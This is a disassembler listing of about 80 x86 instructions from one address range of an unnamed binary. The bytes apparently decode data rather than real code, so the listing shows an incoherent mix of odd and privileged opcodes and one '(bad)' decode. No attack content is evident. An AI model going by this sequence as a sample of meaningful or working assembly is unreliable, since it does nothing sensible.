  424f0d:	4e                   	dec    %esi
  424f0e:	cf                   	iret
  424f0f:	3a 48 27             	cmp    0x27(%eax),%cl
  424f12:	c1 13 3a             	rcll   $0x3a,(%ebx)
  424f15:	00 b3 ec 2c d9 a5    	add    %dh,-0x5a26d314(%ebx)
  424f1b:	c5 1e                	lds    (%esi),%ebx
  424f1d:	b2 97                	mov    $0x97,%dl
  424f1f:	9e                   	sahf
  424f20:	10 8b 89 77 02 64    	adc    %cl,0x64027789(%ebx)
  424f26:	7b 50                	jnp    0x424f78
  424f28:	f4                   	hlt
  424f29:	3c 6d                	cmp    $0x6d,%al
  424f2b:	29 e6                	sub    %esp,%esi
  424f2d:	15 5f 02 d8 ee       	adc    $0xeed8025f,%eax
  424f32:	51                   	push   %ecx
  424f33:	db ca                	fcmovne %st(2),%st
  424f35:	c7 43 b4 bc a0 35 8d 	movl   $0x8d35a0bc,-0x4c(%ebx)
  424f3c:	ae                   	scas   %es:(%edi),%al
  424f3d:	79 27                	jns    0x424f66
  424f3f:	66 a0 52 19 3f 92    	data16 mov 0x923f1952,%al
  424f45:	2b 0b                	sub    (%ebx),%ecx
  424f47:	18 84 04 fd f0 76 dd 	sbb    %al,-0x22890f03(%esp,%eax,1)
  424f4e:	ef                   	out    %eax,(%dx)
  424f4f:	c9                   	leave
  424f50:	68 b6 e1 a2 5a       	push   $0x5aa2e1b6
  424f55:	8f                   	(bad)
  424f56:	d3 7b 4c             	sarl   %cl,0x4c(%ebx)
  424f59:	68 c5 54 3e 41       	push   $0x413e54c5
  424f5e:	b7 2d                	mov    $0x2d,%bh
  424f60:	30 1a                	xor    %bl,(%edx)
  424f62:	a9 06 22 f3 9b       	test   $0x9bf32206,%eax
  424f67:	df 14 cc             	fists  (%esp,%ecx,8)
  424f6a:	8d b8 06 a5 7f 91    	lea    -0x6e805afa(%eax),%edi
  424f70:	f8                   	clc
  424f71:	7d 71                	jge    0x424fe4
  424f73:	6a ea                	push   $0xffffffea
  424f75:	56                   	push   %esi
  424f76:	63 43 dc             	arpl   %eax,-0x24(%ebx)
  424f79:	2f                   	das
  424f7a:	55                   	push   %ebp
  424f7b:	1c ce                	sbb    $0xce,%al
  424f7d:	08 47 f5             	or     %al,-0xb(%edi)
  424f80:	c0 e1 39             	shl    $0x39,%cl
  424f83:	ce                   	into
  424f84:	b2 ba                	mov    $0xba,%dl
  424f86:	2b a7 a4 93 1d 80    	sub    -0x7fe26c5c(%edi),%esp
  424f8c:	96                   	xchg   %eax,%esi
  424f8d:	6c                   	insb   (%dx),%es:(%edi)
  424f8e:	0f 59 88 45 01 32 7a 	mulps  0x7a320145(%eax),%xmm1
  424f95:	1e                   	push   %ds
  424f96:	f3 0a 6c f7 e5       	repz or -0x1b(%edi,%esi,8),%ch
  424f9b:	e3 5e                	jecxz  0x424ffb
  424f9d:	d0 d7                	rcl    $1,%bh
  424f9f:	bc 50 a9 c9 95       	mov    $0x95c9a950,%esp
  424fa4:	42                   	inc    %edx
  424fa5:	82 bb 6e 34 5b ad 47 	cmpb   $0x47,-0x52a4cb92(%ebx)
  424fac:	26 34 9f             	es xor $0x9f,%al
  424faf:	20 18                	and    %bl,(%eax)
  424fb1:	0d 91 f9 0a e6       	or     $0xe60af991,%eax
  424fb6:	83 d2 fc             	adc    $0xfffffffc,%edx
  424fb9:	be 75 ab ee 97       	mov    $0x97eeab75,%esi
  424fbe:	67 84 e0             	addr16 test %ah,%al
  424fc1:	70 59                	jo     0x42501c
  424fc3:	5d                   	pop    %ebp
  424fc4:	d2 49 4b             	rorb   %cl,0x4b(%ecx)
  424fc7:	36 c4 22             	les    %ss:(%edx),%esp
  424fca:	3d 0f b6 fb 2f       	cmp    $0x2ffbb60f,%eax
  424fcf:	e8 a8 d4 21 c1       	call   0xc164247c
  424fd4:	9a ad 13 9a 8c 86 05 	lcall  $0x586,$0x8c9a13ad
  424fdb:	73 7e                	jae    0x42505b
  424fdd:	5f                   	pop    %edi
  424fde:	f7 4b 70 38 e9 24 62 	testl  $0x6224e938,0x70(%ebx)
  424fe5:	11 db                	adc    %ebx,%ebx
  424fe7:	fd                   	std
  424fe8:	54                   	push   %esp
  424fe9:	ea cd d6 46 c3 bf af 	ljmp   $0xafbf,$0xc346d6cd
  424ff0:	38 9c b1 88 2a 75 a3 	cmp    %bl,-0x5c8ad578(%ecx,%esi,4)
  424ff7:	61                   	popa
  424ff8:	1c 4e                	sbb    $0x4e,%al
  424ffa:	95                   	xchg   %eax,%ebp
  424ffb:	3a 0e                	cmp    (%esi),%cl
  424ffd:	27                   	daa
  424ffe:	87 13                	xchg   %edx,(%ebx)
